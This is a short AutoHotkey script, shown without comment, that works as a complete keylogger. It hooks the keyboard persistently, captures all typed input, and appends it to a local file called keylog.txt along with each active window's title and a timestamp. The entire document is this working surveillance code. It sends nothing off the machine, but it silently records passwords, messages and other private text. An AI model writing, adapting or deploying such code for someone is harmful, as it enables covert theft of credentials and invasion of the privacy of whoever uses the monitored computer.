
#Persistent
#InstallKeybdHook



oldtitle=nothing
Loop
{
  Input, UserInput, V C, {enter}.{esc}{Space}{tab}{Left}{Right}{Up}{Down}{Home}{End}
  tvar:=Errorlevel
  WinGetActiveTitle, watitle
  if (watitle != oldtitle and watitle != "")
  {
    FileAppend, `n`n-------- %watitle% --------`n, keylog.txt
    FormatTime, CurrentDateTime,, MM-dd-yyyy  hh:mm:ss tt
    FileAppend, --------%CurrentDateTime% --------`n,keylog.txt
    oldtitle = %watitle%
  }
  IfInString, tvar, EndKey:
  {
    StringSplit,endkey,tvar,`:
    if endkey2=Enter
      FileAppend, %UserInput%`n, keylog.txt
    else if endkey2=Space
      FileAppend, %UserInput%%A_space%, keylog.txt
    else
      FileAppend, %UserInput%%A_space%[%endkey2%]%A_space%, keylog.txt
  }
}
return